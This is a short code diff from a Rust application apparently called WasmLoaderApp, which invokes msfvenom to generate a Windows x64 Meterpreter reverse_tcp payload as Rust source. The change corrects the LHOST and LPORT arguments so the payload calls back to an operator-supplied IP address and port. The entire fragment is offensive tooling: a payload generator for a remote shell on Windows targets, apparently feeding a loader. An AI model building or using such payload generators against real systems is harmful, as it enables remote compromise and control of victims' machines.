@@ -443,8 +443,8 @@ impl WasmLoaderApp {
         match Command::new(msfvenom_cmd)
             .args(&[
                 "-p", "windows/x64/meterpreter/reverse_tcp",
-                "LHOST", &self.ip_address,
-                "LPORT", &self.port,
+                &format!("LHOST={}", self.ip_address),
+                &format!("LPORT={}", self.port),
                 "-f", "rust",
                 "-o", output_file
             ])
